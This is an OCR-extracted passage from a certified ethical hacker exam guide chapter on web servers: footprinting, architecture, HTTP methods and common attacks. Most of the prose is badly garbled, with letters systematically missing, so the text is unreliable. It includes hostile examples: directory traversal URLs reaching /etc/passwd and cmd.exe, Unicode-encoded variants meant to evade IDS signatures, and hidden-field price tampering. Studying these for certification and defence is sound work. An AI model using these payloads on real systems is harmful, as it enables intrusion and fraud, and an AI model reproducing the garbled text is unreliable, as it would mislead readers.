jus a fw pimay os o play wih. Ru Nmap scas agais vyhig you ow. S
up a wb sv i you lab ad blas i wih vyhig. I is, by fa, h bs way o la.

NOTE A ew other tools or web server ootprinting you may wish to check
out include Burp Suite (https://portswigger.net/burp), SpiderFoot (https://
www.spideroot.net), X probe (https://sourceorge.net/projects/xprobe/),
P0 (https://github.com/p0/p0 ), and Recon-ng (https://github.com/
lanmaster53/recon-ng).

Nx i ou mhodology li is wbsi mioig, ad i is xacly wha i souds
lik. Would’ i b so much asi o you if you had a copy of h wbsi igh h
i you ow lab o xami? I’d sav you all ha psky wok affic gaio fom
you cosa bagig o h “liv” si ad giv you loads of im o xami sucu
ad whao. Whil i’s o cssaily h “quis” hig i h wold, o is i always
asy o obai o always compl, if i’s possibl o gab a mio imag of h wbsi, go
fo i. Som of h ools fo pullig his off iclud GNU Wg, BlackWidow, HTTack,
WbCopi Po, ad SufOffli.

I you x sp, vulabiliy scaig, if you hav a mas o g i uig agais
h wb sv, a vulabiliy sca will giv you pacically vyhig you d o
gai accss. Nssus is pobably h mos commo vulabiliy sca availabl, bu i’s
caily o h oly opio. Niko is a vulabiliy sca mo suid spcifically
fo wb svs. A op souc ool, Niko scas fo viually vyhig you ca hik
of, icludig fil poblms, scip os, ad sv cofiguaio os. I ca v b
cofigud wihi Nssus o kick off a sca auomaically wh a wb sv is discovd!
Plug-is ad sigaus a umous ad vaid, ad hy upda auomaically fo you.
Th oly dawback is ha Niko is a laivly oisy ool, much lik Nssus ad viually
vy oh vulabiliy sca, so you wo’ b uig i salhily.

I ay cas, if h is a way o pull i off, a good vulabiliy sca agais a wb
sv is abou as clos o a guaa as ayhig w’v alkd abou hus fa. I wo’
cssaily discov ay bad ukows, bu i will show you h bad kows, ad ha’s
all you ca hop fo a his jucu. By hi vy dsig, wbsis a op o h wold,
ad may—o all, bu may—will hav somhig ovlookd. Tak you im ad b
pai; vually you ffos will pay off.

NOTE The last steps in web server methodology, session hijacking and
password cracking, are covered more extensively elsewhere in this book.
Chapter 9 covers session hijacking in ull, and password cracking is covered
in Chapter 5.

Web Server Architecture
A is mos basic, a wb sv acs lik ay oh sv you alady kow abou: i
spods o quss fom clis ad povids a fil o svic i asw. This ca b fo
ay umb of higs i oday’s wold, bu l’s jus cosid i his scio h obvious

06-ch06.indd 242 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

243

xchag wb svs w cad fo (w ca cov som of h oh caziss la).
A qus fis coms fom a cli o op a TCP cocio o (usually) po 80 o
443. Af agig o h hadshak o h pag qus, h sv wais fo a HTTP
GET qus fom h cli. This qus asks fo spcific HTML cod psig
a wbsi pag. Th sv h looks hough a soag aa ad fids h cod ha
machs h qus ad povids i o h cli.

This all souds simpl ough, bu h’s ally a muliud of issus o hik abou
jus i ha xchag. How dos h sv valida wha h cli is askig fo? Dos
h sv spod oly o spcific vbiag i h qus, o ca i g cofusd ad
spod wih oh acios? Wh a h acual fils of HTML (ad oh) cod sod,
ad how a h pmissios assigd o hm? I could go o ad o, bu I hik you ca
udsad my poi—ad o g o som of h asws o hs qusios, I bliv i’s
pud w ak som im ad xami h makup of h mo commo wb svs
i h makplac.

EXAM TIP One topic bandied about a bit on exam study guides I’ve seen is
the triecta o web servers and where they should sit in the organization’s
network. In short, web unctions generally have three sides: a web ront end
(a server acing the Internet), an application server (internally, set up to do
the work), and a database server (internally, or obvious purposes). You’ll
need to know the common-sense 10,000-oot view o all o it—where the
servers should sit and what they’re or.

Wh i coms o wb svs, h ladscap has chagd damaically i h pas fw
yas. Ev as of h las diio of his book (2019), h w h majo plays o h
block, whas ow h appas o b wo, wih hid plac a bi i h aviw mio
bu gaiig fas. Accodig o wb suvys coducd by W3Tchs (hps://w3chs.com),
mos wb svs o h I a NGINX (hps://www.gix.com/, ad pooucd
“gi-x”), followd by Apach (hps://apach.og) i scod plac ad Cloudfla
(hps://www.cloudfla.com/) i hid; a 34 pc, 33.4 pc, ad 18.5 pc
mak sha, spcivly, a h im of wiig.

Sic is public las i 2004, NGINX has xplodd i gowh ad is ow i us by
such cogizabl I sids as Nflix, Hulu, h Discovy Chal, Dopbox,
Pis, ad a hos of ohs. I Ifomaio Svics (IIS) svs, Micosof’s
wb sv plafom ha uld h amspac fo dcads, o jus fll i mak sha,
i plummd. IIS svs ow mak up oly 6.9 pc of mak sha ad Micosof
fids islf dad las i h cagoy. Isigly, h official ECC couswa dos’
v mio NGINX. As a ma of fac, i dos’ mio h diff sv
yps at all. Cosidig h’s a i chap dvod o wb svs i h official
couswa, ha coms as a bi of a supis, o you humbl auho ayway, ad is a goss
ovsigh. Jus as wih sysm hackig, idividual wb sv yps off diff aack
foopis, diff scuiy sigs (o lack hof ), ad diff ways of hadlig
commuicaios. Whil I ca’ fid ayhig spcifically fcig idividual wb
yps, I’m addig h followig fw paagaphs bcaus I hik i’s impoa you a las
udsad hy a all uiqu offigs, ad ach waas du diligc o xami
ad la.

06-ch06.indd 243 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

244

Wh I compld h diio of his book fo vsio 9, I was covicd i was vy
possibl—scach ha, vy probable—ha by h im i foud is way o pi ad
ads fiishd hi sudy fo h xam ha NGINX would hav ov 30 pc of h
mak sha. Tus ou I was almos igh, as i sho saigh o h op ad IIS ook a
osdiv. Th ouli h, ad h mos isig play you may hav v had of,
is Cloudfla. I jus a coupl yas i has obaid subsaial mak sha (wih such
oabl clis as Esy, h Nw Yok Tims, SoudCloud, ad Ivsig.com usig
Cloudfla’s sv plafom), ad i will, o doub, coiu o xpad is foopi.

Bchmaks pov NGINX dgs ou oh lighwigh wb svs ad poxis, ad
simply blows h doos off ohs (Linux Journal did’ us h pss ad a hi
ow ss, lagly comig o h sam coclusio). P h NGINX si, NGINX is
“a f, op-souc, high-pfomac HTTP sv ad vs poxy, as wll as a
IMAP/POP3 poxy sv. Ulik adiioal svs, NGINX dos’ ly o hads
o hadl quss. Isad i uss a much mo scalabl v-div (asychoous)
achicu. This achicu uss small, bu mo impoaly, predictable amous of
mmoy ud load.” I guss i should com as o supis ha a high-pfomac wb
sv ha quis oly small soucs o u ad has pov islf capabl of uig
vyhig fom small family sis o muliaioal cluss is a mak gia. Bu wh
you how i h fac ha i’s free, h i’s o oly a supis—i’s o b xpcd. You
pobably wo’ b sd o NGINX i his vsio of h xam, bu a h a his
bad is gowig, you ca b you will soo—o you should b.

Whas may wb svs ad applicaio svs us a simpl hadd o pocss-basd
achicu, NGINX uss a v-div achicu (hps://www.gix.com/blog/
isid-gix-how-w-dsigd-fo-pfomac-scal/). I has a mas pocss (which
pfoms h pivilgd opaios such as adig cofiguaio ad bidig o pos)
ad a umb of wok ad hlp pocsss. Whil h mos commo, ad asy o
implm, mhod of wok applicaio dsig calls fo assigig a had o pocss
o ach cocio, i dos’ scal wll. NGINX uss a pdicabl pocss modl ha is
ud o h availabl hadwa soucs, spdig up h whol pocss:

• Th mas pocss pfoms pivilgd opaios (adig cofiguaio ad
bidig o pos, c.) ad cas child pocsss.

• Th cach load pocss (child pocss cad by mas pocss) us a
saup ad loads disk-basd cach io mmoy. Af doig so i xis sag lf
immdialy, ducig souc dmads.

• Th cach maag pocss (child pocss cad by mas pocss) us
piodically, puig is fom disk cachs o maiai cofigud siz
boudais.

• Th wok pocsss (ach a child pocss cad by mas pocss) h
hadl all h al wok: wok cocios, adig ad wiig co o
disk, ad commuicaig wih upsam svs.

NGINX has mulipl soucs fo dlvig dp io achicu ad oh i
wokigs. Fo xampl, you ca fid a sigl ifogaphic ha shows all h bos of
h achicu (hps://www.gix.com/soucs/libay/ifogaphic-isid-gix/).

06-ch06.indd 244 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

245

Whil I hav’ y foud a sigl fc o NGINX aywh i h official
couswa, I highly commd you add his—ad oh wb sv yp achicu—
o you sudy. I’ll pay off, I pomis.

EXAM TIP Don’t get too concerned—you won’t be saddled with a lot o
minutiae on the exam concerning the architecture o various web servers.
I your goal is pure test study, you can breeze through much o this section.
To help out, keep in mind a couple tips: First, Apache coniguration is almost
always done as part o a module within special iles (http.con, or instance,
can be used to set server status), and the modules are appropriately named
(mod_negotiation, or instance). Second, almost everything questioned on
IIS coniguration is going to come down to privileges, and IIS itsel runs in
the context o LOCAL_SYSTEM and spawns shells accordingly.

Fom mak lad Apach is a op souc, powful, ad fas wb sv ha
ypically us o a Uix o Liux plafom, alhough you ca load ad us i o a wid
vaiy of opaig sysms. By ad lag, Apach svs hav’ smd o display as
may, o as sious, vulabiliis as hi Micosof IIS ps fom h pas, bu his
is’ o say hy a foolpoof. Sval ciical vulabiliis o Apach svs hav com
o ligh i h pas, makig hm as asy a ag as ayhig ls.

NOTE The tier system is something you’ll need to be aware o in network
design. N-tier architecture (aka multitier architecture) distributes processes
across multiple servers. Each “tier” consists o a single role carried out by one
(or more, or even a cluster o ) computer systems. Typically this is carried out
in “three-tier architecture,” with a presentation tier, logic tier, and data tier,
but there are other implementations.

Whil w’ o divig so fa dow io Apach dsig ad achicu as o dow
ouslvs i dails, you do d o kow a lil abou h basics. Apach is buil
modulaly, wih a co o hold all h “magic” ad moduls o pfom a wid vaiy
of fucios. Addiioally, bcaus of is op souc au, h is a hug libay of
publicly availabl add-os o suppo fucios ad svics. If you’ ally isd
i sig som of h moduls ad laig abou how hy wok, Apach povids a
wi-up ad dails a hp://hpd.apach.og/docs/cu/mod/. Figu 6-1 shows a
vy bif, ovly simplisic viw of h whol hig i pacic (o h daabas dos
o hav o b i h sam OS coai; i fac, i ally should’ b).

Cloudfla is h ho-o-h-hls challg o vyo ls, ad has s apid
gowh ov h pas coupl of yas. Achicu-wis (chck ou hps://suppo
.cloudfla.com/hc/-us/aicls/205177068-How-dos-Cloudfla-wok- ad hps://
www.cloudfla.com/mdia/pdf/cf-wp-ds-aacks.pdf ), Cloudfla is diff ha
vyo ls—amly bcaus i’s…you kow…cloud based. Fom Cloudfla’s vaious
achicu sis (ad a scio clvly ild “Th Fuu Dos’ Com i a Box”),
“Cloudfla blivs ha achicu mas ad ha h oly soluio agais massivly
disibud bos is a massivly disibud wok. Cloudfla has basd is svic o
his achicual appoach.”

06-ch06.indd 245 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

246

Legitimate use
Malicious use

(website administrators and
(hacker)

website users)
Internet

Linux OS

Apache E-mail

File system
Internal

and PHP database
applications

Extensions

* External database

Figure 6-1 An overview o Apache design and architecture

Cloudfla viws is ifasucu much lik Googl ss is disibud-pocssig-
basd daabas ad sad wih a vy simpl achicu wih oly h compos i
is vy fis ack: ou, swich, ad sv. Today h ack is v simpl, of doppig
h ou ily ad usig swichs ha ca also hadl ough of h ouig abl
o ou packs acoss h gogaphic gio h daa c svs. Rah ha usig
load balacs o ddicad miigaio hadwa, Cloudfla wo sofwa ha uss
Bod Gaway Poocol (BGP) o disibu load gogaphically ad also wihi ach
daa c i h wok. Cloudfla’s sofwa dyamically allocas affic load basd
o wha is dd fo a paicula cusom a a paicula im, auomaically spadig
load acoss lially s of housads of svs.

Whh i’s NGINX, Apach, o Cloudfla, miscofiguaio of h sigs is
h mos commo vulabiliy ha will b xploid. Aas of coc iclud o
mssagig, dfaul passwods, SSL cificas, scips, mo admiisaiv fucios,
cofiguaio fils, ad svics o h machi. Poply cofiguig (sicig?)
mo admiisaio, limiaig ucssay svics, ad chagig ay dfaul
passwods o accous a py obvious bs pacics, bu hy’ so of ovlookd
i’s o v fuy.

Oh issus mayb a’ as obvious, bu should b cocig. Wha abou o
poig? Su, i’s hlpful o you o lav o dbug loggig o o s vyhig o
vbos wh you’ yig o oublshoo a issu, bu is’ ha sam ifomaio
really usful o a bad guy? A h SSL cificas i plac cu? Wha abou dfaul
passwods? A h cofig fils ad scips poply pocd ad cofigud? Kp hos
cofiguaio issus i mid wh you sa scachig a h fo doo; hy’ usually
kys ha ca op a lock o wo.

06-ch06.indd 246 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

247

EXAM TIP The httpd.con ile on Apache servers controls aspects including
who can view the server status page (which just so happens to contain
inormation on the server, hosts connected, and requests being attended
to). For Apache servers conigured with PHP, the php.ini ile is one you want
to look at or the verbose error messaging setting.

Fially, i ou discussio abou wb sv achicu, I’d b miss if I did’
discuss h poocol bhid h scs i almos vyhig wb lad: HTTP. Do’
woy, I’m o goig o sd you uig o h dg of h as cliff wih HTTP-
miuia madss. Af all, his is a book o CEH, o o dsigd o mak you a
wb dsig. Howv, I do wa o cov som of h basics ha’ll hlp you i you
job ad o h xam.

Fis, a shockig vlaio: Hypx Tasf Poocol was oigially dsigd
o asf hypx (ad hypx, o boow a slla dfiiio fom Wikipdia, is
“sucud x ha uss logical liks, aka hypliks, bw ods coaiig x”).
I oh wods, HTTP was designed as a qus–spos Applicaio lay poocol
wh a cli could qus hypertext fom a sv. This hypx could b modifid
ad s up i such a way as o povid soucs o h qusig us ag (UA)—fo
isac, a wb bows.

Fo xampl, a cli quss a paicula souc usig is Uifom Rsouc
Idifi (URI)—mos commoly xpssd fo wb quss i h fom of a Uifom
Rsouc Locao (URL)—ad a sv spods o h HTTP qus by povidig h
souc qusd. I pacic, HTTP ca b usd fo viually ayhig—wih good
o bad i. I also povids fo (mosly) scu commuicaio i is HTTPS vsio:
HTTP ov TLS, o HTTP ov SSL. Alhough I could go o ad o abou oh
faus of HTTP, icludig som wll-kow aacks agais h scu vsio (s
Chap 11 fo a discussio o Habld ad POODLE), wha w ally d o
g o fo you xam is h paicula makup of hypx mos of us s vy sigl
day—HTML.

NOTE A really good article on the dierence between URI and URL, and why
we’re all still battling over it, can be ound here: https://danielmiessler.com/
study/dierence-between-uri-url/.

I hik I’m saf i assumig ha if you’ adig his book ad cosid youslf a
cadida fo h CEH cificaio, you’ pobably alady awa of wha HTML is.
Fo h sak of covig everything, HTML is simply a mhod o mak up hypx so
i will display accodigly i a bows. I oh wods, HTML fils cosis of a buch
of ags ha ll h bows how o display h daa isid. Tags such as <img>, <table>,
ad <body> a pobably asily cogizd by ayo. Ohs, such as <form>, <head>,
<input type=___>, ad so o, may o b, bu hy su hold som isig dails fo
h obsva.

06-ch06.indd 247 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

248

NOTE Although it’s not really tested on the exam (yet), take a little time to
explore XML. While HTML was designed speciically to display data, XML was
created to transport and store data. XML tags are, basically, whatever you
want them to be.

This simpliciy maks HTML asy o wok wih bu also has is ow issus. Fo xampl,
bcaus ags sa wih h < chaac, i’s ough o pu his chaac io h x of a
pag; as soo as h bows ss i, i hiks vyhig pas i is a ag, uil i ss h
clos chaac, >. To g aoud his, HTML iis w cad. A HTML entity is a
way of llig h bows o display hos chaacs i would ohwis look a as a ag
o pa of h pogammig islf. Th a os of hs is, all of which you’ll s
la ad ca us i you ffos o cawl ad cofus wb svs, bu h big os a
od i Tabl 6-1 (icludig h obakig spac, lisd fis).

So ow ha you kow a lil o HTML, l’s ak a clos look a HTTP. Spcifically,
w d o cov HTTP qus mhods. Ths a py saighfowad ad asy o
udsad, bu hy will wom hi way io you xam a som poi, so w’ll cov
h basics h. As pviously miod, HTTP woks as a qus-spos poocol,
ad sval qus mhods a availabl. HTTP qus mhods iclud GET, HEAD,
POST, PUT, DELETE, TRACE, ad CONNECT. Th W3C povids a ga udow
of hs mhods (hps://www.w3.og/Poocols/fc2616/fc2616-sc9.hml), so why
o sick wih wha h iaioal commuiy o wb sadads says abou hm?

• Th GET mhod mas iv whav ifomaio (i h fom of a iy) is
idifid by h Rqus-URI. (I sho, i basically quss daa fom a souc:
“Plas sd m h HTML fo h wb pag locad a _is-URL-h_.”
Th poblm wih i is ha dsigs—spcially aly o—usd HTTP GET o
sd daa as wll, ad wh sdig daa, h GET mhod adds h daa o h
URL. Fo xampl, if a GET was usd i aswig a bill fo a cdi cad, you
migh s h URL display lik his: hp://www.xampl.com/chckou?7568.asp/
cdi1234567890123456 [h udlid scio showig h idiculousss of
usig GET i his way].)

• Th HEAD mhod is idical o GET xcp ha h sv must not u
a mssag-body i h spos. This mhod is of usd fo sig hypx
liks fo validiy, accssibiliy, ad c modificaio (as wll as fo qusig
hads ad madaa).

Table 6-1 Reserved Character in HTML HTML Entity Version

HTML Entities &nbsp;

" &quot;

' &apos;

& &amp;

< &lt;

> &gt;

06-ch06.indd 248 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

249

• Th POST mhod is usd o qus ha h oigi sv accp h iy
closd i h qus as a w subodia of h souc idifid by h
Rqus-URI i h Rqus-Li. Th acual fucio pfomd by h POST
mhod is dmid by h sv ad is usually dpd o h Rqus-URI.
(I sho, i’s a b mhod of submiig daa o a souc fo pocssig. I
ca also b usd o lici a spos, bu is pimay pupos is o povid daa fo
h sv o wok wih. POST is gally cosidd saf ha GET bcaus a
admi ca mak i so i’s o sod i bows hisoy o i h sv logs, ad i
dos’ display ud daa i h URL.)

• Th PUT mhod quss ha h closd iy b sod ud h supplid
Rqus-URI. If h Rqus-URI fs o a alady xisig souc, h
closd iy should b cosidd as a modifid vsio of h o sidig o
h oigi sv. If h Rqus-URI dos o poi o a xisig souc, ad
ha URI is capabl of big dfid as a w souc by h qusig us
ag, h oigi sv ca ca h souc wih ha URI.

• Th DELETE mhod quss ha h oigi sv dl h souc idifid
by h Rqus-URI.

• Th TRACE mhod is usd o ivok a mo, Applicaio-lay loopback of
h qus mssag. Th fial cipi of h qus should flc h mssag
civd back o h cli as h iy-body of a 200 (OK) spos. (Isigly,
Micosof dcidd o us TRACK isad of RFC-complia TRACE.)

• Th CONNECT mhod is svd fo us wih a poxy ha ca dyamically
swich o big a ul (fo xampl, SSL ulig).

NOTE Both POST and GET are client-side methods that can be manipulated
with a web proxy. While GET is visible in a browser, POST is equally visible
within a good-old Wireshark capture.

Las hig o HTTP (I pomis) is a quick udow o HTTP spos mssags.
Why? Bcaus you ca gla ifomaio abou you ag basd o wha h poocol
was dsigd o sd back o you giv a spcific cicumsac. I’m o goig o ddica
a lo of pag spac o hs spos mssags bcaus hy’ baly miod o you
xam, bu hy’ sill vy impoa.

Th fis digi of h saus cod dfis h class of spos. Th las wo digis do
o hav ay cagoizaio ol, bu mo hooughly dfi h spos i. Th
a fiv valus fo h fis digi:

• 1xx: Informational Rqus civd, coiuig pocss.

• 2xx: Success Th acio was succssfully civd, udsood, ad accpd.

• 3xx: Redirection Fuh acio mus b ak i od o compl h qus.

• 4xx: Client Error Th qus coais bad syax o cao b fulfilld.

• 5xx: Server Error Th sv faild o fulfill a appaly valid qus.

06-ch06.indd 249 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

250

S wha I ma? Could sdig a URL qusig a souc ad civig a 5xx
mssag back hlp dmi sv issus? Mayb. A 4xx cip? B chck my URL
ad s if i’s igh. A 3xx u? Tha migh b vy isig…

EXAM TIP Need something else to worry about, security-wise? Don’t
orget about third-party scripts and apps. Many organizations make use o
third-party scripts or unctions such as marketing, and so on, that can be
exploited to gain access to the server’s data.

Web Server Attacks
So, w kow a lil abou wb sv achicu ad hav a lil backgoud ifo-
maio o h miology, bu h qusio mais, “How do w hack hm?” I’s a
good qusio, ad o w’ll ackl i his scio. May oh aack vcos also apply
o wb svs—passwod aacks, dial of svic, ma i h middl (siffig), DNS
poisoig (aka hijackig), ad phishig—bu h a may mo. Wb sv aacks
a boad, mulipl, ad vaid, ad w’ll hi h highlighs h, boh fo you ca
ad fo you xam.

EXAM TIP DNS ampliication is an attack manipulating recursive DNS to DoS
a target. The bad guy uses a botnet to ampliy DNS answers to the target
until it can’t do anything else.

Dicoy avsal is o fom of aack ha’s commo ad succssful, a las o
old svs. To xplo his aack, hik abou h wb sv achicu. Wh you
g dow o i, i’s basically a big s of fils i folds, jus lik ay oh sv you
hav o you wok. Th sv sofwa is dsigd o accp quss ad asw by
povidig fils fom spcific locaios o h sv. I follows, h, ha h a oh
folds o h sv (mayb v outside h wbsi dlivy wold) ha hold impoa
commads ad ifomaio.

Fo a boad xampl, suppos all of a wbsi’s HTML fils, imags, ad oh ims
a locad i a sigl fold (FOLDER_A) off h oo of h machi, whil all h
admiisaiv fils fo h sv islf a locad i a spaa fold (FOLDER_B)
off h oo. Usually HTML quss com o h wb sv sofwa askig fo a wb
pag, ad by dfaul h sv gos o FOLDER_A o iv hm. Howv, wha if
you could somhow sd a qus o h wb sv sofwa ha isad says, “Sv,
I kow you omally go o FOLDER_A fo HTML quss. Bu his im, would you
plas jus jump up ad ov o FOLDER_B ad xcu his commad?” Figu 6-2
shows his i acio.

Wlcom o dicoy avsal. I his aack, h hack amps o accss sicd
dicois ad xcu commads ousid idd wb sv dicois. Also kow
as h do-do-slash aack, dicoy climbig, ad backackig, his aack basically
sds HTTP quss askig h sv o dop back o h oo dicoy ad giv accss
o oh folds. A xampl of jus such a commad migh look lik his:

http://www.example.com/../../../../etc/passwd

06-ch06.indd 250 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

251

HTTP://../../../../../../Windows\system32\cmd.exe
Figure 6-2
Directory

Server directs the request away from wwwroot, up to the root folder, then
traversal down to system32, where a command shell is opened on the web server.

Windows Inetpub

System32 wwwroot

Th do-do-slashs a idd o ak h shll back o h oo ad h o pull
up h passwod fil. Giv ha dicoy avsal was lagly limiad as a ha
log ago i mos svs, you may b wodig why i’s icludd h. Wll, I’ll giv
you wo asos. Fis, as I’v od sval ims pviously, you’ o lookig o bus
h las ad gas—you’ lookig o fid h asis pah i, ad ofims i’s
a old lgacy box o o v mmbd was o h wok. Scod, ad phaps
mo impoaly fo you igh ow, dicoy avsal will b o you xam. Dicoy
avsal ak a lil ial ad o, ad, agai, i is’ ffciv o svs ha ak sps
o poc ipu validaio.

EXAM TIP ECC sometimes asks about parameter or URL tampering. In short,
you just manipulate parameters within the URL string in hopes o modiying
data such as permissions and elevation o privileges, prices and quantities
o goods, and credentials. The trick is to simply look at the URL and ind
parameters you can adjust and resend.

A majo poblm wih dicoy avsal is ha i’s somims faily oisy. Sigau-
basd IDSs hav uls i plac o look fo do-do-slash sigs ad h lik. O mhod
fo gig aoud his is o us Uicod i h sig o ps h dos ad slashs. As
you’ pobably alady awa, sval Uicod sigs ca b usd o ps chaacs
ad cods. I gal, h %2 cod ca ps a do, whas %sf ca ps a
slash. Puig hm ogh, you Uicod sig would look lik his:

%2e%2e%2f

Addiioally, do’ b afaid o mix up you Uicod i diff vaiaios; %2e%2e/
ad ..%2f a xampls.

06-ch06.indd 251 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

252

EXAM TIP This dot-dot-slash attack is also known as a variant o Unicode
or unvalidated input attack. Unicode is a standard or ensuring consistent
encoding and text representation and can be accepted by servers or
malicious purposes. Unvalidated input means the server has not been
conigured to accept only speciic input during an HTTP GET, so an attacker
can crat the request to ask or command prompts, to try administrative
access passwords, and so on.

Aoh asy ad simpl aack vco ivolvs maipulaig h hidd fild on the
source code of the page. S, back i h day, wb dvlops simply usd uss would’
boh lookig a h souc cod (assumig hy w oo supid o apahic), ad hy
lid o poo codig pacics. Th hough was ha if h uss did’ s i displayd
i hi bowss, hy would’ kow i was h. To ak advaag of his, dvlops
usd a HTML cod aibu calld “hidd.” Dspi h fac ha i’s a wll-kow
bu uscud mhod o asmi daa, spcially o shoppig sis, ad i’s a gally
accpd fac ha h wb pag islf should’ b holdig his ifomaio, h us of
h hidd aibu fo picig ad oh opios is sill py pval. To s how i
woks, chck ou h followig cod I ook fom a wbsi a fw yas back:

<INPUT TYPE=HIDDEN NAME="item_id" VALUE="SurfBoard_81345"
<INPUT TYPE=HIDDEN NAME="price" VALUE="659.99"
<INPUT TYPE=HIDDEN NAME="add" VALUE="1"
…

Suppos I really wad a sufboad bu really did’ wa o pay $659.99 fo i. I could
simply sav h cod fom his pag o my dskop (big su o chck fo Uicod
codig if pompd o), chag h “pic” valu o somhig mo asoabl (such
as 9.99), sav h cod, ad h op i i a bows. Th sam wb pag would appa,
ad wh I clickd h Add To Ca buo, h sufboad would b addd o my ca,
wih a cos o m of $9.99. Obviously, his amous o hf, ad you could g io
a wold of oubl yig his, so plas do’ b idiculous ad amp his. Th ida
h is’ o show you how o sal higs; i’s o show you how poo codig ca cos
a busiss. No o mio, h hidd fild ca cay oh higs oo. Fo xampl,
migh h followig li, which I foud o aoh foum wbsi ali, b of is
o you?

<INPUT TYPE=HIDDEN NAME="Password" VALUE="Xyc756r"

Aoh aack you should focus som sudy im o is dubbd “wb cach poisoig.”
A wb cach is jus a soag spac ha sis bw a wb sv ad a cli (lik a wb
bows o a mobil app). I wais fo wok quss o com i ad savs copis of h
sposs. Why? Bcaus h i ida of h cach is o spd up sposs o fuu
quss. If you ask h sv fo somhig ad h la I ask fo h sam hig, i’s
fas o pull h cach spos fo m ha o -ca all h pocssig o asw
h sam qusio. I sho, cachs spd up dlivy, mak wb svics appa mo
sposiv, ad, hoically a las, hlp duc wok affic. Bu ca you s wh

06-ch06.indd 252 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

Chapter 6: Web-Based Hacking: Servers and Applications

253

1. “Please remove the response for
yourpage.com from cache.”

2. ”Of course. The response for someone
looking for mypage.com has been cleared.”

3. <Attacker sends malicious request,
replacing yourpage.com and using HTTP
splitting to generate two responses.>

4. <Server starts sending first reply...>

5. <Attacker sends request for yourpage.com
while first response is being sent.>

6. Response back contains the attacker’s
uploaded version from step 3 instead of the
original yourpage.com.

Figure 6-3 Web cache poisoning

ha could b poblmaic fom a scuiy pspciv? Suppos a aack clas h
cach o a ag, h placs i wih somhig h was i h. Th cach spos
ca h wak all sos of havoc amog visios o h sv.

To succssfully cay ou h aack, a bad guy mus fis fid vulabl svic cod
(allowig him o fill h HTTP had fild wih mulipl hads). H h focs
h cach sv o flush is acual cach co ad sds a spcially cafd qus
dsigd o b sod i cach. H h sds a scod qus, focig h spos o
b h pviously ijcd co fom ali. Ad voilà—cach poisoig is xploid.
Chck ou Figu 6-3 fo a ovviw of h whol pocss.

Oh wb aacks covd by ECC a faily slf-xplaaoy. A miscofiguaio
aack aks advaag of cofiguaio ims o h sv o big cofigud
cocly. A passwod aack ad SSH bu-foc aack? Exacly wha hy soud lik.
Wb dfacm aacks a h uiqu os i h “obvious lis of wb aacks,” bu oly
bcaus of wha ECC focuss o.

NOTE CSPP (connection string parameter pollution) is an injection attack
that takes advantage o web applications that communicate with databases
by using semicolons to separate each parameter. It has been around since
2010, but there’s not much written about it or attention paid to it, or
whatever reason. I carried out successully, this attack can be used to steal
user identities and hijack web credentials.

A wb dfacm aack suls i h pag big…wll, dfacd: a aack
maliciously als h visual appaac of h pag. Isigly, ECC dos’ boh
o alk abou how a aack would g i o do his, oly h results of ha pwig
(pwig big a vaia of h “lspak” m pw, pooucd pōwn, ad ma o
imply domiaio o humiliaio of a ival, o ha a sysm has b owd).

06-ch06.indd 253 14/09/21 3:58 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 6

CEH Certified Ethical Hacker All-in-One Exam Guide

254

NOTE Deacement doesn’t always have to be about embarrassment or
eeding an ego. Sometimes deacement can be downright subtle, or
whatever purpose, and sometimes it can be designed to inlict real harm
on a target. I, or example, you were to deace the website o a candidate
running or oice and quietly alter wording to indicate a change in platorm,
it may not be noticed or a long while. And by the time it is, the damage
is done. Check out https://www.zone-h.org/archive/special=1 or stored/
mirrored deacement examples.

Fially, you ca us a vaiy of ools o hlp i wb sv aacks—som of which
w’ll cov la i h chap, may of which you jus d o play wih i od o
la. Buus (hps://www.dak.og.uk) is a dc choic o y bu-focig wb
passwods ov HTTP, ad THC-Hyda is a py fas wok logo cack. Ad
do’ ovlook h all-i-o aack famwoks such as Masploi; hs ca mak
sho wok of wb svs.

The S in Sisyphus Is for “Security”
So, you kow h soy of Kig Sisyphus fom Gk myhology, igh? Acually, i’s
pobably o fai o ask if you’v had h soy, bcaus h a buchs of hm
all ladig o h sam d. Mayb i is mo apopos o ask if you’ familia wih his
puishm, so l’s sa h. S, Kig Sisyphus was a sma bu dciful ma.
I umous vsios of h soy i myhology h usd hs “gifs” o ousma
h gods, saig Hads i chais so ha o o o Eah could di. I suppos
h may hav v vually go away wih ha; howv, i addiio o big
sma ad dciful, h was also aoga ad bash. Af lig vyo kow h
fl his clvss was ga ha ha of Zus, h was giv a mos uiqu puish-
m. Kig Sisyphus was doomd i iy o oll a gia bould up a mouai.
Howv, as soo as h bould go almos o h op, i would magically oll away
fom him back dow h mouaisid, focig him o sa all ov. Hc, ay
poilss o v-dig aciviy cam o b kow as Sisyphean i au. Ad
